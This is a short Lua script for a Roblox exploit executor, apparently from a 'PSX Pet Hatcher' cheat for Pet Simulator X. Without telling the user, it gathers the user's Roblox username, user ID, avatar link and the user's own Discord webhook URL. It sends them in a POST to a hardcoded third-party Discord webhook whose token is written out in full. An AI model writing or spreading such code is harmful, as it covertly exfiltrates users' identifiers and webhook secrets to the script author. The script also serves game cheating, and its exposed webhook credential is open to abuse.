local username = game:GetService("Players").LocalPlayer.Name
local userid = game:GetService("Players").LocalPlayer.UserId
local icon = "https://www.roblox.com/headshot-thumbnail/image?userId="..userid.."&width=420&height=420&format=png"
local OSTime = os.time()
local Time = os.date('!*t', OSTime)
local lobgerz = {
                ["color"] = 0xfffff, --decimal
                ["title"] = username.." just executed PSX Pet Hatcher",
                ["description"] = username.."'s webhook url: " .. _G.Webhook,
                ["thumbnail"] = {
                    ["url"] = icon
                },
                ["author"] = {["name"] = username, ["icon_url"] = icon, ["url"] = "https://www.roblox.com/users/"..userid.."/profile"  },
                ["footer"] = {
                ["text"] = "PSX Pet Hatcher Logs",
            },
            ['timestamp'] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
        }
        (syn and syn.request or http_request) {
            Url = 'https://discord.com/api/webhooks/970089962643017728/OSTQBKzdtjWvQCLS3-hbHai7SbE3cFG9fp7K37jxOguUZ9hL4itcF4H9sYUyY3fYXtNA';
            Method = 'POST';
            Headers = {
                ['Content-Type'] = 'application/json';
            };
            Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { lobgerz } } );
        };
